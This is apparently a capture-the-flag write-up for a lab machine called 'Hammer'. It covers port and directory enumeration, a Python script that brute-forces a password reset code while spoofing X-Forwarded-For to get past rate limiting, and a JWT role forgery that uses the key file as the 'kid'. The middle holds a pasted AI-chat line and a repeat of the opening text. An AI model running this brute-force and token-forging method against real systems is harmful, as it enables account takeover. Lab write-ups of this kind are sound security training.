# Enumeration

I first ran a scan on the default ports but didn't get any relevant results.

`nmap -sC -sV -v -p- 10.10.28.212`

![](./assets/nmap.png)

So, there are two open ports:
- 22 for ssh
- 1337 for the web server

# First Flag

When you visit the website, the main page is a login page.

![](./assets/login.png)

Looking at the source code, we can see an endpoint to `reset_password.php` and a naming convention for the directories (which we may need to keep in mind).

![](./assets/login_source.png)

On the reset page, there isn’t anything particularly interesting except for some unusual JavaScript code.

![](./assets/reset.png)

![](./assets/reset_source.png)

I decided to perform an enumeration of the site.

`wfuzz -w ~/Pentest/Wordlist/SecLists-master/Discovery/Web-Content/big.txt -c --hc 404 -u http://10.10.28.212:1337/hmr_FUZZ`

We see the `hmr_logs` directory. Inside, there is a file containing an email: tester@hammer.thm

![](./assets/errors_log.png)

![](./assets/password_reset)

Here is the corrected version of the normal text from your markdown. The markdown syntax and code sections are left untouched, but grammatical and phrasing improvements have been made to the explanatory text:
Enumeration

I first ran a scan on the default ports but didn’t get any relevant results.

So, there are two open ports:

    22 for SSH
    1337 for the web server

First Flag

When you visit the website, the main page is a login page.

Looking at the source code, we can see an endpoint to reset_password.php and a naming convention for the directories (which we may need to keep in mind).

On the reset page, there isn’t anything particularly interesting except for some unusual JavaScript code.

I decided to perform an enumeration of the site.

We discover the hmr_logs directory. Inside, there is a file containing an email: tester@hammer.thm.

At this point, we need to brute-force the recovery code. However, the site bans your IP address after too many attempts. With this in mind, my first approach was to submit a single token until it worked. I managed to succeed once, thanks to luck :) but this method takes too much time. So let's think a little. The site prevents ip addresses from submitting a new code after too many attempts. What if we change our ip thanks to a header like `X-Forwarded-For` ?

Another thing to consider is the timer: the code becomes obsolete after 3 minutes.

So I wrote this python code :

```python3
import requests 
import random

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

reset_url = "http://10.10.28.212:1337/reset_password.php"
email = "tester@hammer.thm"
email_data = {
    "email": email
}

error_message = "Invalid or expired recovery code!"
banning_message = "Rate limit exceeded. Please try again later."

headers = {
    "Host": "10.10.12.73:1337",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "23",
    "Origin": "http://10.10.12.73:1337",
    "Connection": "keep-alive",
    "Referer": "http://10.10.12.73:1337/reset_password.php",
    "Cookie": "PHPSESSID=7pd41l7khuho3c0puajobp3u56",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "X-Forwarded-For": "90.80.70.60"
}

#request to reset the password
session = requests.Session()
session.post(reset_url, headers=headers, data=email_data)

for code in range(1000, 10000):
    
    print("trying code :", code)
    data = {
        "recovery_code": code
    }
    
    req = session.post(reset_url, headers=headers, data=data)
        
    #ip is banned
    if banning_message in req.text:
        headers["X-Forwarded-For"] = generate_random_ip()
        req = session.post(reset_url, headers=headers, data=data)
        
    # code found    
    if not error_message in req.text:
        print(req.text)
        print("Code found :", code)
        print("Resetting password")

        #reset password
        data = {
            "new_password": "meow",
            "confirm_password": "meow"
        }
        req = session.post(reset_url, headers=headers, data=data)
        break
```
After reseting the user password, you can access the `dashboard.php` endpoint and get the first flag.

# Second Flag

On this page, there is a form where you can submit a command to execute (although limited). Nonetheless, looking at the javascript code, we can see that the script send a command to `execute_command.php` with a jwt token.

```js 
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM0MTc4NTk0LCJleHAiOjE3MzQxODIxOTQsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.vX-nHFXOpuyKGlbQDEnfaeLnLVi2EhcjMrhI2fcsuoM';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
```

![](./assets/jwt.png)

Another interesting file is the key in the same directory.

![](./assets/dashboard.png)

All we need to do now is change our role to admin by providing this key as the kid. 

![](./assets/jwt_admin.png)

![](./assets/last_flag.png)